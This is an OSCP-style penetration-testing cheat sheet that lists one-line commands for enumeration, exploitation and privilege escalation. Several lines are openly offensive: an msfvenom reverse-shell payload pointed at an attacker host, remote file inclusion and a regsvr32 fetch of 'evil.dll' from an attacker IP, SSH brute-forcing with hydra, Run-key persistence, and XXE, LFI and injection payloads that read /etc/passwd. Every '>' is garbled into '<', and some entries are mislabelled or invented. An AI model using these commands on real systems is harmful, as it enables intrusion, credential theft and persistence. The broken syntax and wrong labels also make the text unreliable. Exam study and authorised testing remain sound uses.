# OSCP Cheatsheet
## Enumeration - **Network Scanning** - Nmap Scan: `nmap -sC -sV -oN scan_results.txt <TARGET_IP<` - SMB Enumeration: `enum4linux -a <TARGET_IP<` - SNMP Enumeration: `snmpwalk -c public -v1 <TARGET_IP<` - HTTP Enumeration: `nmap --script http-enum <TARGET_IP<` - DNS Enumeration: `dnsenum <TARGET_IP<` - SMTP Enumeration: `smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <TARGET_IP<` - FTP Enumeration: `nmap --script ftp-anon.nse <TARGET_IP<` - DNS Zone Transfer: `dig axfr @<DNS_IP< <DOMAIN<` - **Web Application Enumeration** - Directory Brute Forcing: `dirb http://<TARGET_IP<` - Nikto Scan: `nikto -h http://<TARGET_IP<` - GoBuster: `gobuster dir -u http://<TARGET_IP< -w /usr/share/wordlists/dirb/common.txt` - Burp Suite Spidering: Use Burp Suite GUI to spider the web application - OWASP ZAP Scanning: `zap-cli -–zap-url http://localhost -–zap-api-key <API_KEY< --spider <TARGET_IP<` - Subdomain Enumeration: `sublist3r -d <TARGET_DOMAIN<` - SSL Certificate Enumeration: `openssl s_client -connect <TARGET_IP<:443` - HTTP Method Enumeration: `curl -X OPTIONS http://<TARGET_IP<` - **FTP Enumeration** - Anonymous Login: `ftp <TARGET_IP<` - Directory Listing: `ls` - Check Write Permissions: `ls -la` - Check Transfer Mode: `ftp -n <TARGET_IP< 21` - Check Banner: `nc -nv <TARGET_IP< 21` - Check for Anonymous Upload: `ftp <TARGET_IP<; anonymous; put /etc/passwd` - FTP Bounce Attack: `nc -nv <TARGET_IP< 21` - **SSH Enumeration** - Weak Passwords: `hydra -l <USERNAME< -P <WORDLIST< ssh://<TARGET_IP<` - SSH Key Authentication: `ssh -i <PRIVATE_KEY< <USERNAME<@<TARGET_IP<` - SSH Configuration: `cat /etc/ssh/sshd_config` - Check Remote Forwarding: `ssh -R 80:localhost:80 <TARGET_IP<` - Check Local Forwarding: `ssh -L 80:localhost:80 <TARGET_IP<`
## Exploitation - **Buffer Overflows** - Fuzzing: `msf-pattern_create -l <length<` - Finding Offset: `msf-pattern_offset -q <EIP_value<` - Exploitation: `msf-exploit suggester` - Finding Bad Characters: `!mona findmsp -length <PAYLOAD_SIZE<` - Generating Shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP< LPORT=<ATTACKER_PORT< -f <FORMAT< -b "<BAD_CHARACTERS<"` - Exploit Development: Use Immunity Debugger and Mona script - Remote Buffer Overflow: `nc -nv <TARGET_IP< <PORT<` - **Web Application Exploitation** - SQL Injection: `' OR 1=1--` - Command Injection: `;ls` - XSS Payloads: `<script<alert('XSS')</script<` - Local File Inclusion: `../../../etc/passwd` - Remote File Inclusion: `http://<ATTACKER_IP</malicious.php` - Server-Side Template Injection: `{{7*7}}` - XML External Entity (XXE) Injection: `<!DOCTYPE foo [ <!ELEMENT foo ANY< <!ENTITY xxe SYSTEM "file:///etc/passwd"< ]<<foo<&xxe;</foo<` - Server-Side Request Forgery (SSRF): `http://localhost/admin` - **Privilege Escalation** - Kernel Exploits: `searchsploit <KERNEL_VERSION<` - SUID Binaries: `find / -perm -u=s -type f 2</dev/null` - Sudo Abuse: `sudo -l` - Exploiting Unquoted Service Paths: Use PowerUp.ps1 script - DLL Hijacking: `regsvr32 /s /u /i:http://<ATTACKER_IP</evil.dll` - Registry Hijacking: `reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /v <NAME< /d <PAYLOAD<`
